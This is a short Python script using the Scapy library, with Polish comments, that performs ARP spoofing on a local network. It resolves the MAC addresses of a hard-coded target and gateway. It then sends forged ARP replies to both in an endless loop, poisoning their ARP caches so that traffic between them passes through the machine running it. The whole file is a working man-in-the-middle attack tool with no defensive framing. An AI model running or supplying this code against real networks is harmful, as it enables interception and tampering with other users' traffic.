from scapy.all import *

# skrypt spoofingu- wyłuskanie MAC adresu naszego targetu bez wpisywania naszego adresu w jego tablicę (przekłamanie)
# wymagane protokoły: Ethernet i ARP reszta dowolnie
# wymagany docelowy adres IP i adres IP gatewaya
from scapy.layers.l2 import Ether, ARP

targetip = '192.168.1.163'  # wpisz jakiś swój ip adres, który istnieje
gatewayip = '192.168.1.1'


def getMACAddress(targetip):
    arppacket = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, pdst=targetip)
    targetMAC = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
    return targetMAC


def sendspoofedreply(targetip, targetmac, sourceip): # wysyłamy odpowiedzi ze złym source ip- spoofing
    spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
    send(spoofed, verbose=False)


targetMAC = getMACAddress(targetip)
print('Mac address of target: ', targetMAC)
gatewayMAC = getMACAddress(gatewayip)
#gatewayMAC = 'ac:22:05:a8:5f:c7'
print('Mac address of gateway: ', gatewayMAC)

# spoofing
try:
    while True:
        sendspoofedreply(targetip, targetMAC, gatewayip)
        sendspoofedreply(gatewayip, gatewayMAC, targetip)
except KeyboardInterrupt:
    print('Stop spoofing')
